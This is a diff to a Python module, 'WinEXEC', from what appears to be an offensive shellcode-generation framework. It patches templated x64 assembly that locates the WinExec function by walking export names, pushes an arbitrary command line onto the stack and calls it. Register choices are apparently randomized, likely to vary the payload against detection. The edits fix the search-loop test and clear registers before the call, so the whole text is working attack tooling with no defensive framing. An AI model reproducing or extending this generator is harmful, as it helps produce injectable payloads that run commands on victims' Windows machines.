@@ -35,7 +35,7 @@ def register_arguments(parser):
 
 class module:
     Author = 'psycore8'
-    Version = '0.1.4'
+    Version = '0.1.5'
     DisplayName = 'WinEXEC'
     opcode = ''
     size = 0
@@ -146,7 +146,8 @@ class module:
         stacked_command_list = []
         #padded_bytes = 0
         spacer = ' ' * 16
-        stacked_command_list = vi.prepare_str_to_stack(self.command_line, rcx[0])
+        #stacked_command_list = vi.prepare_str_to_stack(self.command_line, rcx[0])
+        stacked_command_list = vi.prepare_str_to_stack(self.command_line, 'rcx')
         stacked_command = f'\n{spacer}'.join(stacked_command_list)
 
         shellcode = f"""
@@ -256,9 +257,10 @@ class module:
                 
                 add {rsi[0]}, 4                
                 {vi.decrease_register(rcx[0])}
-                cmp {rcx[0]}, 0
-                ;test {rcx[0]}, {rcx[0]}
-                {rc(vi.jump_conditional_negative)} {lb_findFuncPos}
+                ;cmp {rcx[0]}, 0
+                test {rcx[0]}, {rcx[0]}
+                ;{rc(vi.jump_conditional_negative)} {lb_findFuncPos}
+                jnz {lb_findFuncPos}
                 jmp {lb_exit}
 
             {lb_WinExecFound}:
@@ -276,6 +278,8 @@ class module:
                 mov rax, {rax[0]}
 
             {lb_InvokeWinExec}:
+                xor rcx, rcx
+                xor rdx, rdx
                 push rcx 
                 ; begin stacked_command
                 {stacked_command}
